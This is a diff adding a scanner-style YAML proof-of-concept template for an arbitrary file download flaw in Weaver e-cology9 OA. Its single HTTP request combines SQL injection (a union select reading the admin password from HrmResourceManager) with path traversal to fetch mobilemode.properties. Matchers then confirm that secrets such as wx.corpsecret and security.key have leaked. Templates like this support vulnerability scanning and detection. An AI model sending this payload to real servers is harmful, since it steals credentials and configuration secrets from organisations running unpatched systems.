@@ -1,0 +1,31 @@
+id: poc-yaml-weaver-e-cology9-filedownloadlocation-anyfile-download
+info:
+  name: 泛微OA e-cology9 FileDownloadLocation Arbitrary File Download Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: directory-traversal, file-download
+http:
+  - raw:
+      - |
+        GET /weaver/weaver.email.FileDownloadLocation/login/LoginSSOxjsp/x.FileDownloadLocation?ddcode=7ea7ef3c41d67297&downfiletype=eml&download=1&mailId=1123+union+select+*+from+(select+1+as+resourceid,'../ecology/WEB-INF/prop/mobilemode.properties'+as+x2,'3'+as+x3,(select++*+from+(select+*+from+(select+password+from+HrmResourceManager+where+id=1)x)x)+as+x4,5+as+x5,6+as+x6)x+where+1=1&mailid=action.WorkflowFnaEffectNew&parentid=0 HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "wx.corpid ="
+          - "security.key ="
+          - "wx.corpsecret ="
+        part: body
+      - type: word
+        words:
+          - "filename="
+        part: header
+      - type: word
+        words:
+          - "application/octet-stream"
+        part: header
